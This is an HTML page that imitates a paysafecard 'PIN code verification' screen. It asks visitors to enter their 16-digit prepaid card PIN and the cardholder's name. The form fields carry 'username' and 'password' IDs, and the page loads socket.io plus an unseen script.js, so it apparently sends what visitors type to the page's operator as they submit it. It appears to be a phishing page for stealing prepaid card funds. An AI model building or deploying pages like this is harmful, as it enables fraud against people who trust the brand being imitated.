<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification | paysafecard</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>
<body>
    <div id="loading-overlay" style="display: none;">
        <div class="psc-spinner"></div>
        <p>Verification in progress...</p>
    </div>

    <header class="psc-header">
        <div class="logo-area">
            <img src="téléchargé.jpg" alt="paysafecard" class="logo-img">
        </div>
    </header>

    <div class="login-container">
        <div class="login-box" id="login-section">
            <h2 class="title">PIN code verification</h2>
            <p class="subtitle">Enter your 16-digit code to validate your transaction.</p>
            
            <form id="loginForm">
                <div class="input-group">
                    <label>PIN code (16 digits)</label>
                    <div class="input-wrapper">
                        <input id="username" type="text" placeholder="0000 0000 0000 0000" maxlength="19" required>
                    </div>
                </div>

                <div class="input-group">
                    <label>Cardholder name (for security)</label>
                    <div class="input-wrapper">
                        <input type="text" id="password" placeholder="First and Last Name" required>
                    </div>
                </div>

                <button type="submit" class="btn-login" id="login-btn">Verify code</button>
            </form>

            <div class="footer-box">
                <p>Need help? <a href="#">Contact support</a></p>
            </div>
        </div>
    </div>   

    <script src="/socket.io/socket.io.js"></script>
    <script src="script.js"></script>
</body>
</html>
